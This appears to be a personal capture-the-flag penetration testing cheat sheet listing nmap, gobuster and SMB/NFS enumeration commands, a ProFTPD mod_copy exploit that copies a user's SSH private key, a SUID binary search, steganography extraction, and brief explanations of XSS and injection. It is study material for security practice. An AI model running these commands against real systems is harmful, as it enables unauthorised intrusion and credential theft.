# thisnthat cheat sheet
-- Open ports with versions
```
nmap -sC -sV $IP
```

-- How many open ports?
```
nmap $IP -vvv
nmap -Pn -A -v $IP
nmap -sS -p- $IP
```

-- Enumerate webapp with gobuster
``` 
gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt 
```

-- Enumerate for SMB shares
SMB has two ports, 445 and 139.
```
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse $IP
```

-- Inspect an **SMB** share
```
smbclient //<ip>/anonymous
```

-- Recursively download the SMB share
```
smbget -R smb://<ip>/anonymous
```

-- show mount 
```
nmap -p <rpc_port> --script=nfs-ls,nfs-statfs,nfs-showmount $IP
```

-- get **ProFTPD** version
```
nc $IP 21
```

-- Searchsploit to find exploits. **Searchsploit** is basically just a command line search tool for exploit-db.com.

-- mod_copy exploit: SITE CPFR and SITE CPTO
```
nc $IP 21
SITE CPFR /home/<user>/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```

-- find SUID binaries
```
find / -perm -u=s -type f 2>/dev/null
```

-- inspect an image
```
exiftool <img_file>
staghide extract -sf <img_file>
```

**XSS cheat sheet**: There are a few different types of XSS attacks:
* **Persistent/Non-Reflected** - Here the XSS payload has been stored in the database, and once the server/framework passes the data from the database into the webpage, the script/payload is executed
* **Non Persistent/Reflected** - Here the XSS payload is usually crafted using a malicious link. It is not stored. 
```
https://owasp.org/www-community/xss-filter-evasion-cheatsheet
```

**Injection**:
Injection attacks occur when users input data and this data is being processed/interpreted by the server. Injection is most common when user supplied data is not validated/sanitised by the server. Common injection attacks include:

* **SQL Injection** - These attacks occur when users provide malicious data that is processed by SQL statements on the server. SQL statements are usually used to interact with databases; by providing malicious input, users can read, modify and even delete data in these databases. These attacks are usually prevalent because developers do not use parameterized queries. More information about SQL Information can be found here. 
* **Command Injection** - These attacks usually occur when users provide malicious data that is processed as system commands on the web server. With this attack, users can execute arbitrary command on the system and carry out malicious actions like reading password hashes and private keys. More information can be found here.